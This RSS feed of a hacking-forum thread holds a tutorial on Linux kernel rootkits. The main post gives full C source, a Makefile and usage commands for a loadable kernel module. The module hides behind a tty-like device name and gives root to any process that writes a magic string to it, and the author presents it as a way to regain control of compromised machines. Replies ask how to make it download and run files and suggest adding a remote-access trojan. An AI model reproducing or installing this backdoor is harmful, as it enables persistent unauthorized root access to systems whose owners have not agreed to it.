<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Kernel RootKits. Getting your hands dirty</title>
    <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485</link>
    <description>Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel module. I bet you had already build a couple of bots and, at least, one of those useless frameworks... after all you can do that on python or javascript... but the real thing... you have to do in C :P

# Getting Started
Let&#39;s start with a very simple LKM that will allow us to get instant root on whatever machine we install it. Consider it as a quick way to re-gain control of a machine once it was compromised. This is one of the standard functions you&#39;ll find in a rootkit. 

For writing this LKM I used the following great resources. Go and read them. I&#39;m not going to repeat what is in there... specially because I couldn&#39;t do it better.

http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/
http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/
https://github.com/typoon/lkms/tree/master/genesis

The first two are great tutorials on the basics. The third is a module that does what we want, but  didn&#39;t worked for me at first and I had to modified it to get a functional version. The one I will show you in a while.

# Internals
Giving root to a process is as easy as updating its associated credentials. However, we need a way to let the kernel know which process we want to grant those credentials to. There are different ways to interchange information between user space and kernel space. The traditional `ioctl`, the `proc` pseudo file system or a device driver among others. The last two have the extra advantage that can be easily accessed from the command line. We will be using a device driver for our example. (try to change it to use the `proc` file system as an exercise).

The thing is pretty simple, when a process writes a magic string to our special device, our LKM will give root credentials to such process. You can change this approach in many different ways. For instance, another classical way of doing this is writing the `PID` of the process you want to grant permissions.

# The LKM
So, this is the code:

```
#include &lt;linux/init.h&gt;   
#include &lt;linux/module.h&gt; 
#include &lt;linux/kernel.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/fs.h&gt;    
#include &lt;asm/uaccess.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/cdev.h&gt;
#include &lt;linux/cred.h&gt;
#include &lt;linux/version.h&gt;

#define  DEVICE_NAME &quot;ttyR0&quot; 
#define  CLASS_NAME  &quot;ttyR&quot;  

#if LINUX_VERSION_CODE &gt; KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

// Prototypes
static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);


// Module info
MODULE_LICENSE(&quot;GPL&quot;); 
MODULE_AUTHOR(&quot;pico&quot;);
MODULE_DESCRIPTION(&quot;Got r00t!.&quot;); 
MODULE_VERSION(&quot;0.1&quot;); 

static int            majorNumber; 
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = &quot;g0tR0ot&quot;;
  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
	  {
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk (&quot;ttyRK: Cannot prepare credentials\n&quot;);
		return 0;
	      }
	    printk (&quot;ttyRK: You got it.\n&quot;);
	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
	    commit_creds (new_cred);
	  }
        kfree(data);
      }
    else
      {
	printk(KERN_ALERT &quot;ttyRK:Unable to allocate memory&quot;);
      }
    
    return len;
}


static int __init
root_init(void)
{
  printk (&quot;ttyRK: LKM installed!\n&quot;);
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops)) &lt; 0)
    {
      printk(KERN_ALERT &quot;ttyRK failed to register a major number\n&quot;);
      return majorNumber;
    }
   printk(KERN_INFO &quot;ttyRK: major number %d\n&quot;, majorNumber);
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT &quot;ttyRK: Failed to register device class\n&quot;);
       return PTR_ERR(rootcharClass); 
   }

   printk(KERN_INFO &quot;ttyRK: device class registered correctly\n&quot;);
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT &quot;ttyRK: Failed to create the device\n&quot;);
       return PTR_ERR(rootcharDevice);
     }

    return 0;
    
}

static void __exit
root_exit(void) 
{
  // Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);                     
  class_destroy(rootcharClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     

  printk(&quot;ttyRK:Bye!\n&quot;);
}


module_init(root_init);
module_exit(root_exit);

```

If you had read the links I posted above, the code is self-explanatory. Otherwise, go and read them. The relevant part of the module is the `write` function. It gets the user space string that the process is trying to write to the device and compares it with a keyword. If it matches, the credentials are updated.


```
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk (&quot;ttyRK: Cannot prepare credentials\n&quot;);
		return 0;
	      }
	    printk (&quot;ttyRK: You got it.\n&quot;);
	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
	    commit_creds (new_cred);
```

As for kernel 3.4, the credential structure fields changed and that is why I have to use the macro. Check the macro definition at the beginning of the program. I had to navigate the [LXR](http://lxr.linux.no/#linux+v4.9.5/) a bit to find the proper structures and functions to call and which kernel version changed the `struct cred` (to write the conditional macro at the beginning of the code).

There are other ways of getting the same behaviour but I leave that to you to explore. An interesting one is the technique used by the Mr Fontanini&#39;s rootkit (https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit). Haven&#39;t checked whether still works on recent kernels so it is something interesting for you to also try.

In case you haven&#39;t read the links above (really, go and read them). This is the make file to build this module... The standard one

```
obj-m+=root.o

all:
        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean

```

# How to use this module
So, you have type it and compile it. It&#39;s time to try it.

First open a terminal to monitor the kernel log

    $ tail -f /var/log/kern.log

_(The kernel log may be in a different file in your system. Check your distro documentation)_

Then we can load the module

    sudo insmod ./root.ko

The log window will shown the initialisation messages and a new device will pop up under the `/dev` folder. Something called `/dev/ttyR0`. If you list the folder you will find a bunch of `ttySOMETHING` in there... our character device will be difficult to spot at first glance (we will see how to completely hide it a future instalment... hopefully).

By default the device is only accessible by root so we need to change the permissions after loading our module

    $ sudo chmod 0666 /dev/ttyR0

Another interesting exercise is to modify the module so the device is created with the permissions we want.

Now we can use our root backdoor at any time from any terminal or program:

    $ id
    uid=1000(pico) gid=1000(pico) groups=1000(pico)
    $ echo &quot;g0tR0ot&quot; &gt; /dev/ttyR0
    $ id
    uid=0(root) gid=0(root) groups=0(root)

There is a lot of things you can try out of this simple example... So, what are you waiting for?

Hack Fun</description>
    
    <lastBuildDate>Sun, 09 Jul 2017 15:32:24 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/14</link>
        <pubDate>Sun, 21 Jan 2018 00:42:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-14</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[Pwned08000202]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for your reply!</p>
<p>I look at this</p>
<p>If I find a solution I will post it here</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/13</link>
        <pubDate>Sun, 09 Jul 2017 15:32:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-13</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Never tried that, but you can take a look to this:</p>
<p><a href="https://kernelnewbies.org/KernelProjects/usermode-helper-enhancements" class="onebox" target="_blank" rel="nofollow noopener">https://kernelnewbies.org/KernelProjects/usermode-helper-enhancements</a></p>
<p>No idea what is the status in recent kernels</p>
<p>Hope that helps</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/12</link>
        <pubDate>Sun, 09 Jul 2017 15:21:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-12</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[Pwned08000202]]></dc:creator>
        <description><![CDATA[
            <p>Hi everyone,</p>
<p>Maybe you could help me</p>
<p>After a lot of tries and search I did not find the way to execute commands in the userspace from the kernelspace (for a school project I wanted to do a LKM rootkit)</p>
<p>My goal is to download a file and run it from my kernel module</p>
<p>I know it’s a bad idea but it’s just for educational purposes</p>
<p>Have you ever tried to do this ?</p>
<p>Thanks in advance <img src="https://0x00sec.org/images/emoji/twitter/slightly_smiling_face.png?v=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:"></p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/11</link>
        <pubDate>Sun, 09 Jul 2017 15:09:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-11</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for sharing this <a class="mention" href="https://0x00sec.org/u/pwned08000202">@Pwned08000202</a>  … very good!</p>
<p>I’ve to update my code!</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/10</link>
        <pubDate>Sun, 04 Jun 2017 16:33:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-10</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[Pwned08000202]]></dc:creator>
        <description><![CDATA[
            <p>I try to set permission in my LKM with this little piece of code and it works perfectly :</p>
<h2>// set permission for all users in read and write (stop cmd chmod 0666 in dev device)<br>
static int uevent(struct device *dev, struct kobj_uevent_env *env){<br>
add_uevent_var(env, “DEVMODE=%<span class="hashtag">#o</span>”, 0666);<br>
return 0;<br>
}<br>
insert this function before the init function start</h2>
<p>insert this code after your own register device class :</p>
<p>pwnedClass-&gt;dev_uevent = uevent;</p>
<p>in my case pwanedClass is my class name.<br>
I hope this will help you <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/9</link>
        <pubDate>Sun, 04 Jun 2017 13:52:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-9</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[Pwned08000202]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for your reply.<br>
It works now<br>
I uninstall and install again kernel headers and done</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/8</link>
        <pubDate>Tue, 23 May 2017 21:07:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-8</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/pwned08000202">@Pwned08000202</a></p>
<p>A quick copy and paste of your error on Google shows that you may have be using <code>pwd</code> (lowercase) instead of <code>PWD</code> (uppercase) in your Makefile.</p>
<p>Other than that I have no idea…  Usually you only need the kernel source (kernel headers) to compile your module.</p>
<p>Hope this help</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/7</link>
        <pubDate>Mon, 22 May 2017 05:47:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-7</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[Pwned08000202]]></dc:creator>
        <description><![CDATA[
            <p>Hello everyone,</p>
<p>Thank you Pico for this article! It’s very useful<br>
Has anyone ever had this type of problem?<br>
I already install the linux-headers…<br>
If a person has an idea thank you</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/6</link>
        <pubDate>Mon, 22 May 2017 01:05:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-6</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote group-VIP" data-username="pry0cc" data-post="4" data-topic="1485">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
<blockquote>
<p>I think its time to write a rookit with a RAT eh?</p>
</blockquote>
</aside>
<p>Sounds like an interesting project to learn about a lot of topics!. Let’s try <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/5</link>
        <pubDate>Wed, 25 Jan 2017 22:36:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-5</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Pico the wizard.  You did it again. Nice share duuude.  Rootkits to the moon!</p>
<p>I think its time to write a rookit with a RAT eh?</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/4</link>
        <pubDate>Wed, 25 Jan 2017 13:25:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-4</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="0x00pf" data-post="1" data-topic="1485">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel module.</p>
</blockquote>
</aside>
<p>Two down; one to go!!!</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/3</link>
        <pubDate>Wed, 25 Jan 2017 01:47:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-3</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
        <description><![CDATA[
            <p>I know this is probably a really basic thing, but it’s still awesome! Thanks for sharing.</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/2</link>
        <pubDate>Tue, 24 Jan 2017 23:40:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-2</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
      <item>
        <title>Kernel RootKits. Getting your hands dirty</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel module. I bet you had already build a couple of bots and, at least, one of those useless frameworks… after all you can do that on python or javascript… but the real thing… you have to do in C <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<h1>Getting Started</h1>
<p>Let’s start with a very simple LKM that will allow us to get instant root on whatever machine we install it. Consider it as a quick way to re-gain control of a machine once it was compromised. This is one of the standard functions you’ll find in a rootkit.</p>
<p>For writing this LKM I used the following great resources. Go and read them. I’m not going to repeat what is in there… specially because I couldn’t do it better.</p>
<p></p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="http://derekmolloy.ie/wp-content/uploads/2013/05/seriesyonkis.ico" class="site-icon" width="32" height="32">
      <a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/" target="_blank" rel="noopener nofollow ugc">derekmolloy.ie</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png" class="thumbnail" width="" height="">

<h3><a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/" target="_blank" rel="noopener nofollow ugc">Writing a Linux Kernel Module — Part 1: Introduction | derekmolloy.ie</a></h3>

<p>Guide to writing loadable kernel modules (LKMs) for embedded Linux devices (e.g., BeagleBone). Part 1 builds a "hello world" code example with custom parameters</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="http://derekmolloy.ie/wp-content/uploads/2013/05/seriesyonkis.ico" class="site-icon" width="32" height="32">
      <a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/" target="_blank" rel="noopener nofollow ugc">derekmolloy.ie</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png" class="thumbnail" width="" height="">

<h3><a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/" target="_blank" rel="noopener nofollow ugc">Writing a Linux Kernel Module — Part 2: A Character Device | derekmolloy.ie</a></h3>

<p>Guide to writing loadable kernel modules (LKMs) for embedded Linux devices (e.g., BeagleBone). Part 2 builds a character driver for 3.x.x kernel devices.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/typoon/lkms/tree/master/genesis" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e092731d83213375f887ed36a6ab26862a0b6951.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/typoon/lkms/tree/master/genesis" target="_blank" rel="noopener nofollow ugc">typoon/lkms</a></h3>

<p>Linux kernel modules developed by me for learning purposes - typoon/lkms</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>The first two are great tutorials on the basics. The third is a module that does what we want, but  didn’t worked for me at first and I had to modified it to get a functional version. The one I will show you in a while.</p>
<h1>Internals</h1>
<p>Giving root to a process is as easy as updating its associated credentials. However, we need a way to let the kernel know which process we want to grant those credentials to. There are different ways to interchange information between user space and kernel space. The traditional <code>ioctl</code>, the <code>proc</code> pseudo file system or a device driver among others. The last two have the extra advantage that can be easily accessed from the command line. We will be using a device driver for our example. (try to change it to use the <code>proc</code> file system as an exercise).</p>
<p>The thing is pretty simple, when a process writes a magic string to our special device, our LKM will give root credentials to such process. You can change this approach in many different ways. For instance, another classical way of doing this is writing the <code>PID</code> of the process you want to grant permissions.</p>
<h1>The LKM</h1>
<p>So, this is the code:</p>
<pre><code class="lang-auto">#include &lt;linux/init.h&gt;   
#include &lt;linux/module.h&gt; 
#include &lt;linux/kernel.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/fs.h&gt;    
#include &lt;asm/uaccess.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/cdev.h&gt;
#include &lt;linux/cred.h&gt;
#include &lt;linux/version.h&gt;

#define  DEVICE_NAME "ttyR0" 
#define  CLASS_NAME  "ttyR"  

#if LINUX_VERSION_CODE &gt; KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

// Prototypes
static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);


// Module info
MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("pico");
MODULE_DESCRIPTION("Got r00t!."); 
MODULE_VERSION("0.1"); 

static int            majorNumber; 
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = "g0tR0ot";
  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
	  {
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("ttyRK: Cannot prepare credentials\n");
		return 0;
	      }
	    printk ("ttyRK: You got it.\n");
	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
	    commit_creds (new_cred);
	  }
        kfree(data);
      }
    else
      {
	printk(KERN_ALERT "ttyRK:Unable to allocate memory");
      }
    
    return len;
}


static int __init
root_init(void)
{
  printk ("ttyRK: LKM installed!\n");
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops)) &lt; 0)
    {
      printk(KERN_ALERT "ttyRK failed to register a major number\n");
      return majorNumber;
    }
   printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to register device class\n");
       return PTR_ERR(rootcharClass); 
   }

   printk(KERN_INFO "ttyRK: device class registered correctly\n");
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to create the device\n");
       return PTR_ERR(rootcharDevice);
     }

    return 0;
    
}

static void __exit
root_exit(void) 
{
  // Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);                     
  class_destroy(rootcharClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     

  printk("ttyRK:Bye!\n");
}


module_init(root_init);
module_exit(root_exit);

</code></pre>
<p>If you had read the links I posted above, the code is self-explanatory. Otherwise, go and read them. The relevant part of the module is the <code>write</code> function. It gets the user space string that the process is trying to write to the device and compares it with a keyword. If it matches, the credentials are updated.</p>
<pre><code class="lang-auto">	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("ttyRK: Cannot prepare credentials\n");
		return 0;
	      }
	    printk ("ttyRK: You got it.\n");
	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
	    commit_creds (new_cred);
</code></pre>
<p>As for kernel 3.4, the credential structure fields changed and that is why I have to use the macro. Check the macro definition at the beginning of the program. I had to navigate the <a href="http://lxr.linux.no/#linux+v4.9.5/" rel="noopener nofollow ugc">LXR</a> a bit to find the proper structures and functions to call and which kernel version changed the <code>struct cred</code> (to write the conditional macro at the beginning of the code).</p>
<p>There are other ways of getting the same behaviour but I leave that to you to explore. An interesting one is the technique used by the Mr Fontanini’s rootkit (<a href="https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit" rel="noopener nofollow ugc">https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit</a>). Haven’t checked whether still works on recent kernels so it is something interesting for you to also try.</p>
<p>In case you haven’t read the links above (really, go and read them). This is the make file to build this module… The standard one</p>
<pre><code class="lang-auto">obj-m+=root.o

all:
        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean

</code></pre>
<h1>How to use this module</h1>
<p>So, you have type it and compile it. It’s time to try it.</p>
